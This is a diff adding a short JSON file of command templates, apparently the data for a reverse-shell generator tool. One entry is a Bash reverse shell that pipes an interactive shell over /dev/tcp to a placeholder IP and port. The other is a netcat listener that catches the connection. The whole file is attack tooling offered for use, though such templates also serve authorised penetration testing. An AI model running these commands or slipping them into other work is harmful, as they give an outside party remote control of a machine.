@@ -1,0 +1,12 @@
+{
+  "commands": [
+    {
+      "title": "Basic Bash Reverse Shell",
+      "template": "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
+    },
+    {
+      "title": "Netcat Listener",
+      "template": "nc -lvnp {port}"
+    }
+  ]
+}
